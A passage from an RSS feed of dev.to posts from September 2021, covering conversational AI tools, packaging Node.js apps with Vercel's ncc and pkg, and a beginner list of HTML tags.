&lt;li&gt;&lt;p&gt;There's a free course on Codecademy too. You can check it out  &lt;a href="https://www.codecademy.com/learn/learn-go"&gt;&lt;strong&gt;here&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>go</category>
      <category>codenewbie</category>
      <category>100daysofcode</category>
    </item>
    <item>
      <title>1.3 - AWS Amplify Admin UI</title>
      <author>Alex Patterson</author>
      <pubDate>Wed, 15 Sep 2021 02:32:12 +0000</pubDate>
      <link>https://dev.to/codingcatdev/aws-amplify-admin-ui-2m65</link>
      <guid>https://dev.to/codingcatdev/aws-amplify-admin-ui-2m65</guid>
      <description>&lt;p&gt;Original: &lt;a href="https://codingcat.dev/podcast/1-3-aws-amplify-admin-ui-with-rene-brandel"&gt;https://codingcat.dev/podcast/1-3-aws-amplify-admin-ui-with-rene-brandel&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;iframe width="710" height="399" src="https://www.youtube.com/embed/p33Q9cT_dNQ"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;&lt;iframe width="100%" height="232px" src="https://open.spotify.com/embed/episode/1VaD0we7TmA8t6YCEaL4sw"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

</description>
      <category>podcast</category>
      <category>webdev</category>
      <category>devops</category>
      <category>aws</category>
    </item>
    <item>
      <title>Conversational AI should be in every developer toolbox. Here's why.</title>
      <author>Arthur Grishkevich</author>
      <pubDate>Wed, 15 Sep 2021 01:35:49 +0000</pubDate>
      <link>https://dev.to/arrrgr/conversational-ai-should-be-in-every-developer-toolbox-here-s-why-349i</link>
      <guid>https://dev.to/arrrgr/conversational-ai-should-be-in-every-developer-toolbox-here-s-why-349i</guid>
      <description>&lt;p&gt;Hi folks. I‚Äôve posted a few conversational AI tutorial articles here. I realize that I failed to talk about one important thing - why you, as a developer, should even think about adding conversational technologies to your stack of tools.¬†&lt;/p&gt;

&lt;p&gt;Fair warning: I work for a startup with the world‚Äôs most advanced conversational AI APIs and a studio built specifically for developers. Because of this, the examples of use cases and approaches below will be based on the art of the possible with Dasha. I will also talk to you about Google Dialogflow and Rasa AI which offer great sets of tools for some use cases. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#why-think-about-conversational-voice-technologies-in-the-first-place%C2%A0%C2%A0"&gt;
  &lt;/a&gt;
  Why think about conversational voice technologies in the first place¬†¬†
&lt;/h2&gt;

&lt;p&gt;Voice is the native interface for human-human communication. And that‚Äôs it. That‚Äôs your reason for why you should think about conversational AI technologies. The tactile way in which we communicate with machines today is a stepping stone.¬†&lt;/p&gt;

&lt;p&gt;Look at science fiction to show you the way (I have been doing this since I learned to read and it hasn‚Äôt steered me wrong). HAL 5000 in 2001: A Space Odyssey, Eddie the ship's computer in HHGTTG, Jarvis in Iron Man. These are all machines that communicate with humans at a level indistinguishable from a human being. In this communication commands are born not in the simple command-response ways of today‚Äôs Alexa. &lt;/p&gt;

&lt;p&gt;These machines parse deep intent from the words of the human that is conversing with them, from their intonations, emotional tone and from the wider context of the conversation. Which is the same thing that humans do.¬†Which makes the human feel comfortable in conversing with the machines. Which, in other words, passes the Turing test. &lt;/p&gt;

&lt;p&gt;In order for voice user interfaces to become ubiquitous, we need conversational AI that communicates at a level indistinguishable from a human, without falling into an uncanny valley trap.¬†&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#where-is-conversational-voice-ai-today%C2%A0"&gt;
  &lt;/a&gt;
  Where is conversational voice AI today¬†
&lt;/h2&gt;

&lt;p&gt;What is done with conversational AI today: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Chatbots. Mainly simple, often multiple-choice apps. Great for taking an order or routing a customer to the right support agent. I felt I had to mention, though the focus of this article is on voice. &lt;/li&gt;
&lt;li&gt;Basic voice user interfaces - Alexa Skills, Siri assistant and such. They are great for fulfilling a single function, for example, tell you the weather or play a song. As these are command-response interactions, they do not aim to pass the Turing test and they are limited in scope of application. &lt;/li&gt;
&lt;li&gt;Voice AI business automation. Call center automation from simple voice (not touch tone) menus to more complex outbound applications. Some of these applications (mainly outbound today) do aim to pass the Turing test and oftentimes do pass it. &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We‚Äôre not yet at the point where conversational AI can fully replace tactile interfaces. Yet we are getting there. Here is me giving a demo of a conversational app which I recently built:¬†&lt;/p&gt;

&lt;p&gt;&lt;iframe width="710" height="399" src="https://www.youtube.com/embed/46nyWBTSHgs"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;This is a fairly simple demo. It only took me a few of hours to build from scratch. Using the same technology already today some Dasha users are building conversations with hundreds of logical nodes.¬†In live call center environments, some apps are performing better than their human agent counterparts were before them. &lt;/p&gt;

&lt;p&gt;If you want to try building an app like the one in point 3, just look at my post history for some tutorials or pop in to our conversational AI dev &lt;a href="https://community.dasha.ai"&gt;community&lt;/a&gt;. You'll get an API key and instructions automatically upon joining. @ me in the intro channel, I‚Äôll help where I can. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-will-adding-conversational-ai-to-your-toolbox-give-you-as-a-developer"&gt;
  &lt;/a&gt;
  What will adding conversational AI to your toolbox give you, as a developer?
&lt;/h2&gt;

&lt;p&gt;It will give you two things. The ability to build voice interfaces for your apps and the ability to run automated telephone conversations with an API call. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#voice-user-interfaces"&gt;
  &lt;/a&gt;
  Voice user interfaces
&lt;/h3&gt;

&lt;p&gt;With a deep voice interface you can let your users engage every interaction in your app with their voice. &lt;/p&gt;

&lt;p&gt;A few use cases for this: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If your app is designed to be used on the go (walking, running, driving), for example, it‚Äôs a navigation app, a music app, etc.&lt;/li&gt;
&lt;li&gt;If there is a use case in which your app runs in the background, while the user switches to another app. &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I think in the future, VUIs will be standard fare in most new software products. &lt;/p&gt;

&lt;p&gt;In the meantime, you can implement a voice user interface with Dasha using a connector to our Node.js SDK. Next year, we will roll out Swift and Kotlin SDKs. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#automated-telephone-conversations"&gt;
  &lt;/a&gt;
  Automated telephone conversations
&lt;/h3&gt;

&lt;p&gt;Kind of like Twilio giving developers the ability to use SMS text messages with the call of an API, a proper conversational AI API gives you the ability to conduct automated calls with the call of an API. &lt;/p&gt;

&lt;p&gt;Here are just a few use cases you might want to use this for: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Call a user who abandoned their shopping cart and ask if they need any help completing the purchase or have some questions they need answered.&lt;/li&gt;
&lt;li&gt;Call a user to verify some details or call them up as a part of an onboarding process. &lt;/li&gt;
&lt;li&gt;Set up a fully automated customer service line for your product. You can take calls through telephony or in-app using voice over GRPC.
&lt;/li&gt;
&lt;li&gt;Call back a newly generated lead in less than a minute to convert them into a user. &lt;/li&gt;
&lt;li&gt;Build a voice Discord bot that can do pretty much anything you can think of. &lt;/li&gt;
&lt;li&gt;Literally build a replacement for a call center agent and impress your boss at the big bank. &lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#what-skills-do-you-need-to-build-with-conversational-ai"&gt;
  &lt;/a&gt;
  What skills do you need to build with conversational AI?
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#analytical"&gt;
  &lt;/a&gt;
  Analytical
&lt;/h3&gt;

&lt;p&gt;Analytical skills are important for two reasons. One - you need to logically structure your conversation before you begin developing it. Two - you will need to analyze live conversations that your AI app has with real human users and implement changes to improve the app. Rasa AI calls this second part Conversation Driven Development. I love this term. We at Dasha call it training the application. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#coding"&gt;
  &lt;/a&gt;
  Coding
&lt;/h3&gt;

&lt;h4&gt;
  &lt;a href="#google-dialogflow"&gt;
  &lt;/a&gt;
  Google Dialogflow
&lt;/h4&gt;

&lt;p&gt;Interestingly enough, with Google Dialogflow, the analytical skill is the only one you will need to create conversations - it is an in-browser GUI for creating automated dialogues.  You can provide intents training data, create scripts,  STT and TTS comes out of the box. Two software engineers who tested all three platforms felt that their learning curve was higher with Dialogflow even though it was a no-code environment, than with Rasa or Dasha. Pros: no-code platform. Biggest cons: speech synthesis sounds very robotic, hard to make dialogue paths handle digressions. You may need a bit of technical knowledge to set up integrations through web hooks.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#rasa-ai"&gt;
  &lt;/a&gt;
  Rasa AI
&lt;/h4&gt;

&lt;p&gt;To use Rasa, you will need to have Python installed to use Rasa Open Source. Knowledge of Python will be needed as you build. You can specify intents, as a part of training data. As mentioned earlier, Rasa is a technology for chatbots. If you want to use it with voice, you will need to connect external text to speech and speech to text. Connecting to external services obviously adds delays which detracts from the conversational user experience. &lt;/p&gt;

&lt;p&gt;There are multiple dialogue policies which can be used simultaneously and which dictate conversation flow (I found this a bit confusing). Rasa has a great low-code/no-code GUI for conversational design. You describe dialogue using stories and intents using NLU data. You can also specify bot responses, forms (collecting data) and rules. The open source Rasa server runs on your machine and connects to your app. &lt;/p&gt;

&lt;p&gt;Its main pro is that you can quickly build simple, straightforward text conversations. Its main drawback is that it is a bot builder. It does not aspire to let you create conversations which are human-like in form and content.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#dasha-ai"&gt;
  &lt;/a&gt;
  Dasha AI
&lt;/h4&gt;

&lt;p&gt;To use Dasha, you will need to have Node.js installed. You will also want to know JavaScript. DashaScript is a domain-specific language which you use to script the dialogue between the machine and the user. &lt;/p&gt;

&lt;p&gt;You specify intents training data, much as you do with Rasa, but with Dasha you can also define named entities which can be used for slot filling. You define AI responses in the phrase map or right within the body of your dialogue script. You can define &lt;a href="https://dasha.ai/en-us/blog/using-digressions"&gt;digressions&lt;/a&gt; (send conversation to a specific node at any point based on what the user has said), to emulate how humans do dialogue. Human-like speech synthesis and text to speech come out of the box. Dasha SDK runs within your Node.js app, the conversation gets executed in the Dasha Cloud. &lt;/p&gt;

&lt;p&gt;Dasha‚Äôs main pro is that you can build simple human-like conversations quickly or take longer to build complex conversations of nearly unlimited depth. Its main drawback is that we are still in Beta and polishing up some details with user feedback. All the more reason to join our &lt;a href="https://community.dasha.ai"&gt;community&lt;/a&gt; and be one of the folks giving their input to this AI as a service engine. Don‚Äôt get it twisted though, we have paying customers using the product even in its Beta. Dasha AI is processing close to 10 million conversations monthly. &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#in-closing"&gt;
  &lt;/a&gt;
  In closing
&lt;/h2&gt;

&lt;p&gt;To summarize, you‚Äôll be able to add conversational AI to your stack of developer tools even if you have only a few months of programming experience. I‚Äôm a case in point - I started building with Dasha, then started teaching myself JavaScript with FreeCodeCamp. I have used Rasa Open Source and had no problem with it even though my Python skills are almost non-existent.&lt;/p&gt;

&lt;p&gt;You should hold some of these tools in your stack because they let you engage with users in ways that differentiate the user experience.  &lt;/p&gt;

&lt;p&gt;Have you used conversational AI dev tools before? &lt;/p&gt;

</description>
    </item>
    <item>
      <title>Vercel's pkg - Package your Node.js app into a single executable</title>
      <author>Sivamuthu Kumar</author>
      <pubDate>Wed, 15 Sep 2021 01:28:51 +0000</pubDate>
      <link>https://dev.to/ksivamuthu/vercel-s-pkg-package-your-node-js-app-into-a-single-executable-3mhf</link>
      <guid>https://dev.to/ksivamuthu/vercel-s-pkg-package-your-node-js-app-into-a-single-executable-3mhf</guid>
      <description>&lt;p&gt;Hello all, In this short post, we will take a look at Vercel's pkg - how we can package the Node.js app into a single executable. &lt;/p&gt;

&lt;p&gt;When we are developing a Node.js application, it totally makes sense to install dev tools, dependencies to build and run an application. In the end, the user is interested in running the app and not the code and libraries the developer integrates. In the Node.js world, it's getting tougher that - when we release the packages, the sources are also released along with the 100s of dependency code as node_modules. It brings the necessity of the package mechanism to build and distribute the node library as a single executable - with the runtime or as a single file to run on already installed nodejs runtime.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#build-the-nodejs-app-into-a-single-file-ncc"&gt;
  &lt;/a&gt;
  Build the Node.js app into a single file - ncc
&lt;/h3&gt;


&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--i3JOwpme--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-ba8488d21cd8ee1fee097b8410db9deaa41d0ca30b004c0c63de0a479114156f.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/vercel"&gt;
        vercel
      &lt;/a&gt; / &lt;a href="https://github.com/vercel/ncc"&gt;
        ncc
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      Compile a Node.js project into a single file. Supports TypeScript, binary addons, dynamic requires.
    &lt;/h3&gt;
  &lt;/div&gt;
&lt;/div&gt;


&lt;p&gt;ncc - Simple CLI for compiling a Node.js module into a single file, together with all its dependencies, gcc-style.&lt;/p&gt;

&lt;p&gt;Install the ncc using the below command.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight docker"&gt;&lt;code&gt;npm i -g @vercel/ncc
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt;Build the project using this simple command. It will output the Node.js compact build of app.js into dist/app.js&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight docker"&gt;&lt;code&gt;ncc build app.js -o dist
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;h3&gt;
  &lt;a href="#package-the-nodejs-app-into-a-single-executable-pkg"&gt;
  &lt;/a&gt;
  Package the Node.js app into a single executable - pkg
&lt;/h3&gt;


&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--i3JOwpme--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-ba8488d21cd8ee1fee097b8410db9deaa41d0ca30b004c0c63de0a479114156f.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/vercel"&gt;
        vercel
      &lt;/a&gt; / &lt;a href="https://github.com/vercel/pkg"&gt;
        pkg
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      Package your Node.js project into an executable
    &lt;/h3&gt;
  &lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;pkg - This command-line interface enables you to package your Node.js project into an executable that can be run even on devices without Node.js installed.&lt;/p&gt;

&lt;p&gt;Install the pkg using the below command&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight docker"&gt;&lt;code&gt;npm install -g pkg
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt;Run the pkg build targeting multiple platforms. It will create the executable in the dist directory&lt;br&gt;
&lt;/p&gt;
&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight docker"&gt;&lt;code&gt;pkg -t node12-linux,node14-linux,node14-win index.js
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;Targets&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;pkg&lt;/code&gt;¬†can generate executables for several target machines at a time. You can specify a comma-separated list of targets via¬†&lt;code&gt;--targets&lt;/code&gt;¬†option. A canonical target consists of 3 elements, separated by dashes, for example¬†&lt;code&gt;node12-macos-x64&lt;/code&gt;¬†or¬†&lt;code&gt;node14-linux-arm64&lt;/code&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;nodeRange&lt;/strong&gt;¬†(node8), node10, node12, node14, node16 or latest&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;platform&lt;/strong&gt;¬†alpine, linux, linuxstatic, win, macos, (freebsd)&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;arch&lt;/strong&gt;¬†x64, arm64, (armv6, armv7)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;
  &lt;a href="#demo"&gt;
  &lt;/a&gt;
  Demo
&lt;/h3&gt;

&lt;p&gt;Check out this repo &lt;/p&gt;


&lt;div class="ltag-github-readme-tag"&gt;
  &lt;div class="readme-overview"&gt;
    &lt;h2&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--i3JOwpme--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev.to/assets/github-logo-ba8488d21cd8ee1fee097b8410db9deaa41d0ca30b004c0c63de0a479114156f.svg" alt="GitHub logo"&gt;
      &lt;a href="https://github.com/ksivamuthu"&gt;
        ksivamuthu
      &lt;/a&gt; / &lt;a href="https://github.com/ksivamuthu/vercel-pkg-demo"&gt;
        vercel-pkg-demo
      &lt;/a&gt;
    &lt;/h2&gt;
    &lt;h3&gt;
      Vercel PKG Demo
    &lt;/h3&gt;
  &lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Run locally and verify whether it's logging the telemetry in the console.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight docker"&gt;&lt;code&gt;‚ûú vercel-pkg-demo git:(main) npm i
‚ûú vercel-pkg-demo git:(main) node index.js
IoT Device Initialized
Telemetry: {"temperature":"56.12","humidity":"52.11"}
Telemetry: {"temperature":"68.30","humidity":"51.90"}
Telemetry: {"temperature":"53.78","humidity":"53.72"}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Run &lt;code&gt;npm run build&lt;/code&gt; to build the package into executable.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight docker"&gt;&lt;code&gt;"scripts": {
    "build": "npx pkg -t linux,macos,win . --out-path dist"
 },
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The build steps are added in GitHub Actions and you can see the executable files are added as artifacts after build.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ir3gdlvi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1631668176228/CYq3OOsGM.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ir3gdlvi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://cdn.hashnode.com/res/hashnode/image/upload/v1631668176228/CYq3OOsGM.png" alt="image.png"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let's download the executable and run and see whether we are seeing the same output.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight docker"&gt;&lt;code&gt;./hvac-demo-device-macos
‚ûú  dist git:(main)  ./hvac-demo-device-macos
IoT Device Initialized
Telemetry: {"temperature":"70.59","humidity":"46.23"}
Telemetry: {"temperature":"69.76","humidity":"49.93"}
Telemetry: {"temperature":"62.15","humidity":"58.93"}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#use-cases"&gt;
  &lt;/a&gt;
  Use cases
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Make a commercial version of your application without sources&lt;/li&gt;
&lt;li&gt;Make a demo/evaluation/trial version of your app without sources&lt;/li&gt;
&lt;li&gt;Instantly make executables for other platforms (cross-compilation)&lt;/li&gt;
&lt;li&gt;No need to install Node.js and npm to run the packaged application&lt;/li&gt;
&lt;li&gt;Put your assets inside the executable to make it even more portable&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h3&gt;

&lt;p&gt;I've found vercel's pkg very useful in order to achieve a similar target and package a whole application into standalone executables for multiplatform. It's nice to have a single file that can be started right away without any external dependency. And also, it prevents from having to distribute the full sources. You can extend it for including assets and other requirements.&lt;/p&gt;

&lt;p&gt;I'm Siva - working as Sr. Software Architect at Computer Enterprises Inc from Orlando. I'm an AWS Community builder, Auth0 Ambassador and I am going to write a lot about Cloud, Containers, IoT, and Devops. If you are interested in any of that, make sure to follow me if you haven‚Äôt already. Please follow me &lt;a class="mentioned-user" href="https://dev.to/ksivamuthu"&gt;@ksivamuthu&lt;/a&gt;
 Twitter or check out my blogs at blog.sivamuthukumar.com&lt;/p&gt;

</description>
      <category>node</category>
      <category>javascript</category>
      <category>github</category>
    </item>
    <item>
      <title>57 Essential HTML Tags To Know As A Beginner</title>
      <author>Aya Bouchiha</author>
      <pubDate>Tue, 14 Sep 2021 23:48:44 +0000</pubDate>
      <link>https://dev.to/ayabouchiha/57-essential-html-tags-to-know-as-a-beginnert-1f3f</link>
      <guid>https://dev.to/ayabouchiha/57-essential-html-tags-to-know-as-a-beginnert-1f3f</guid>
      <description>&lt;p&gt;Hi everybody, I'm &lt;a href="//developer.aya.b@gmail.com"&gt;Aya Bouchiha&lt;/a&gt;, after creating two posts about 10 important HTML Tags, I decided to talk about 57 essential HTML tags to know as a beginner.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://dev.to/ayabouchiha/5-html-tags-that-almost-nobody-knows-5p5"&gt;part-1: 5 HTML Tags That Almost Nobody Knows&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dev.to/ayabouchiha/part-2-5-html-tags-that-almost-nobody-knows-nj8"&gt;Part-2: 5 HTML Tags That Almost Nobody Knows&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;but if you're not familiar with 'HTML tags', I highly recommend checking at least one of the given resources in this post. &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://dev.to/ayabouchiha/resources-to-learn-html-css-cko"&gt;Resources To Learn HTML &amp;amp; CSS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#57-essential-html-tag-that-is-good-to-know-as-beginner"&gt;
  &lt;/a&gt;
  57 Essential HTML Tag That Is Good To Know As Beginner.
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;div&amp;gt;&lt;/strong&gt;: for defining a division.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;header&amp;gt;&lt;/strong&gt;: for creating a header.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;section&amp;gt;&lt;/strong&gt;: for defining a section.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;address&amp;gt;&lt;/strong&gt;: is a tag that displays the contact information like email and phone number of the author of a document or an article&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;nav&amp;gt;&lt;/strong&gt;: for creating navigation.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;main&amp;gt;&lt;/strong&gt;: for assigning the main content.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;footer&amp;gt;&lt;/strong&gt;: for creating a footer.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;form&amp;gt;&lt;/strong&gt;: for defining a form which is a section that almost contains some input fields that the user should enter for sharing his information like login &amp;amp; sign up forms.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;time&amp;gt;&lt;/strong&gt;: for representing a specific period in time.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;label&amp;gt;&lt;/strong&gt;: for specifying a label like name, email, password for an input field.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;input&amp;gt;&lt;/strong&gt;: for creating an input field.&lt;/li&gt;
&lt;li&gt;&amp;lt;textarea /&amp;gt;: for creating a multiline input so that the user could write a text such as description or bio.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;select&amp;gt;&lt;/strong&gt;: for creating a drop-down menu. &lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;option&amp;gt;&lt;/strong&gt;: for creating an option of a drop-down menu&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;datalist&amp;gt;&lt;/strong&gt;: for creating a list of options that are established in advance.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;fieldset&amp;gt;&lt;/strong&gt;: for grouping a set of elements that discuss the same idea in a form element.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;legend&amp;gt;&lt;/strong&gt;: for defining a title of the fieldset element&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;wbr&amp;gt;&lt;/strong&gt;: for defining a word break chance.&lt;/li&gt;
&lt;li&gt;&amp;lt;br/&amp;gt;: for breaking a line&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;button&amp;gt;&lt;/strong&gt;: for creating a clickable element like text, image, video&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;code&amp;gt;&lt;/strong&gt;: used for defining a text as a code.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;kbd&amp;gt;&lt;/strong&gt;: used to define keyboard input, it is displayed with a monospace font&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;var&amp;gt;&lt;/strong&gt;: for indicating mathematical variables like x, y, and z.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;samp&amp;gt;&lt;/strong&gt;: is used to define sample output from a program.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;pre&amp;gt;&lt;/strong&gt;: for formatting a specific text.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;dl&amp;gt;&lt;/strong&gt;: is used with &lt;strong&gt;&amp;lt;dt&amp;gt;&lt;/strong&gt; and &lt;strong&gt;&amp;lt;dd&amp;gt;&lt;/strong&gt; to define a description list.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;dt&amp;gt;&lt;/strong&gt; defines a term in a description list.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;dd&amp;gt;&lt;/strong&gt; describes a term in a description list.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;del&amp;gt;&lt;/strong&gt;: defining a deleted text.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;ins&amp;gt;&lt;/strong&gt;: for defining an inserted text.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;em&amp;gt;&lt;/strong&gt;: create an emphasized (important) text.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;i&amp;gt;&lt;/strong&gt;: create a text with italic styling.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;u&amp;gt;&lt;/strong&gt;: defining an underlined text, (not recommended to use)&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;b&amp;gt;&lt;/strong&gt;: for creating a bold text.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;strong&amp;gt;&lt;/strong&gt;: for specifying an important text with bold styling.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;small&amp;gt;&lt;/strong&gt;: for creating a text with a small size&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;dfn&amp;gt;&lt;/strong&gt;: used to specify a term that is going to be defined, most browsers display this element with an italic font style.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;abbr&amp;gt;&lt;/strong&gt;: defining an abbreviation, like HTML.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;h1&amp;gt;&lt;/strong&gt;: (h1, h2, h3,..., h6) for specifying a header of specific content.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;a&amp;gt;&lt;/strong&gt;: (anchor tag)for creating a link (hyperlink).&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;mark&amp;gt;&lt;/strong&gt;: for highlighting a text.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;progress&amp;gt;&lt;/strong&gt;:&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;meter&amp;gt;&lt;/strong&gt;: for representing either a scalar value within a known range or a fractional value.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;noscript&amp;gt;&lt;/strong&gt;: for displaying alternate HTML content if the browser does not support scripting.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;q&amp;gt;&lt;/strong&gt;: for defining a "quote".&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;bloquote&amp;gt;&lt;/strong&gt;: for specifying that a text is taken from another place.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;table&amp;gt;&lt;/strong&gt;: for defining a table in your document.&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;thead&amp;gt;&lt;/strong&gt;: (table head)&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;tbody&amp;gt;&lt;/strong&gt;: (table body)&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;th&amp;gt;&lt;/strong&gt;: for creating a title of a specific cell in your table&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;&amp;lt;td&amp;gt;&lt;/strong&gt;: for creating a cell in your table&lt;/li&gt;
&lt;li&gt;
